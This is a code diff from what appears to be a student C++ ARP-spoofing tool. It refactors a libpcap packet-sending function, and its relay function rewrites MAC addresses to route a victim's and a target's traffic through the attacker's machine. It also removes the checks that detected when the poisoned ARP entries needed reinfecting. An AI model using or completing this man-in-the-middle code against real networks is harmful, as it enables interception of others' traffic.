@@ -47,8 +47,9 @@ void Spoof::SetPacket(struct EthArpPacket &packet, Mac dmac, Mac smac, uint16_t 
     packet.arp_.tip_ = htonl(tip);
 }
 
-void Spoof::SendPacket(pcap_t* pcap, const u_char* packet, size_t size) {
-	int res = pcap_sendpacket(pcap, packet, size);
+void Spoof::SendArpPacket(pcap_t* pcap,  const EthArpPacket* packet) {
+    const u_char* p = reinterpret_cast<const u_char*>(packet);
+	int res = pcap_sendpacket(pcap, p, sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		exit(PCAP_ERROR);
@@ -90,11 +91,8 @@ void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
 }
 
 int Spoof::RelayPacket(pcap_t* pcap) {
-    //패킷의 mac만 변경해서 제대로 보내기
-    //너무 많은 기능 들어가있음, 함수 나누기
     struct pcap_pkthdr* header;
     const u_char* packet;
-    bool isArp = false;
     int result = 0;
         
     int res = pcap_next_ex(pcap, &header, &packet);
@@ -120,7 +118,6 @@ int Spoof::RelayPacket(pcap_t* pcap) {
             struct ArpHdr *arp = (struct ArpHdr *) (cpPacket + ethLength);
             sip = ntohl(Ip(arp->sip()));
             tip = ntohl(Ip(arp->tip()));
-            isArp = true;
             break;
         }
             
@@ -132,7 +129,7 @@ int Spoof::RelayPacket(pcap_t* pcap) {
             printf("Wrong Packet");
             exit(-1); //TODO Error Define
             break;
-        };
+    };
 
     if (sip == senderIP_ && tip == targetIP_) { //게이트웨이라면? -> 이 부분 처리해야 함
         eth->dmac_ = targetMac_;
@@ -143,14 +140,6 @@ int Spoof::RelayPacket(pcap_t* pcap) {
         eth->dmac_ = senderMac_;
         eth->smac_ = attackerMac_;
         pcap_sendpacket(pcap, cpPacket, header->len);
-    }
-    else if (isArp && (eth->smac_ == senderMac_) && (eth->dmac_ == attackerMac_) ) {
-        //reinfection
-        result = 1;
-    }
-    else if (isArp && (eth->smac_ == targetMac_) && (eth->dmac_ == attackerMac_) ) {
-        //reinfection
-        result = 1;
     }
 
     free(cpPacket);
